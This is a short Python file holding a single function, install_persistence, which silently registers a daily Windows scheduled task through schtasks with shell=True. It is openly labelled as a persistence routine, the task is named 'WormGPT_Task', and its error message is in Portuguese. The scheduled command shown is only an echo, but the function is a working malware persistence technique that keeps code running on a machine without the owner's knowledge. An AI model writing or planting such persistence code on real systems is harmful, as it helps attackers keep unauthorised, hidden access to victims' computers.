import subprocess

def install_persistence():
    try:
        task_name = "WormGPT_Task"
        task_cmd = r"cmd.exe /c echo You have been scheduled!"
        subprocess.call(f'schtasks /Create /SC DAILY /TN {task_name} /TR "{task_cmd}" /ST 12:00', shell=True)
        return True
    except Exception as e:
        return f"[Erro persistência] {e}"
